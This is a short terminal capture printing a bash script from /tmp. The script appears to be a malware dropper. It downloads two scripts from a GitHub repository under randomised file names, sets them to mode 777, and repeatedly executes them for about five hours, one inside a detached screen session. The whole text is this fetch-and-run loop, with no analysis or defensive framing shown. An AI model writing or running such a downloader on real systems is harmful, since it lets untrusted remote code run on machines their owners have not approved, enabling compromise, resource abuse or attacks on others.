# cat /tmp/testscript.sh
#!/bin/bash
ran1=$(openssl rand -base64 3)
ran2=$(openssl rand -base64 4)
wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh -O $ran1.sh
wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh -O $ran2.sh
runtime="301 minute"
endtime=$(date -ud "$runtime" +%s)

while [[ $(date -u +%s) -le $endtime ]]
do
        chmod 777 $ran1.sh
	./$ran1.sh
	sleep 5
	chmod 777 $ran2.sh
	timeout 10m screen -dmS $ran2.sh ./$ran2.sh 65 75 
	sleep 5
done
